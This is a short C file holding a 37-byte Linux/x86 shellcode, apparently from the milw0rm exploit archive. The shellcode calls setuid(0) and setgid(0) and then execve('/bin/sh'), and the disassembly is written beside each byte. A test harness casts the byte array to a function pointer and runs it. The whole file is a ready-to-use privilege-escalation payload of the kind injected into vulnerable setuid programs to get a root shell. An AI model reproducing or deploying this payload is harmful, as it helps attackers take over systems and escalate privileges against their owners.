/*
 * (Linux/x86) setuid(0) + setgid(0) + execve("/bin/sh", ["/bin/sh", NULL])
 * - 37 bytes
 * - xgc@gotfault.net
 *
 */

char shellcode[] =

  "\x6a\x17"			// push	$0x17
  "\x58"			// pop 	%eax
  "\x31\xdb"			// xor	%ebx, %ebx
  "\xcd\x80"			// int	$0x80

  "\x6a\x2e"			// push	$0x2e
  "\x58"			// pop	%eax
  "\x53"			// push %ebx
  "\xcd\x80"			// int	$0x80

  "\x31\xd2"			// xor	%edx, %edx
  "\x6a\x0b"			// push	$0xb
  "\x58"			// pop	%eax
  "\x52"			// push	%edx
  "\x68\x2f\x2f\x73\x68"	// push	$0x68732f2f
  "\x68\x2f\x62\x69\x6e"	// push	$0x6e69622f
  "\x89\xe3"			// mov	%esp, %ebx
  "\x52"			// push	%edx
  "\x53"			// push	%ebx
  "\x89\xe1"			// mov	%esp, %ecx
  "\xcd\x80";			// int	$0x80

int main() {

	int (*f)() = (int(*)())shellcode;
    printf("Length: %u\n", strlen(shellcode));
    f();
}

// milw0rm.com [2006-04-03]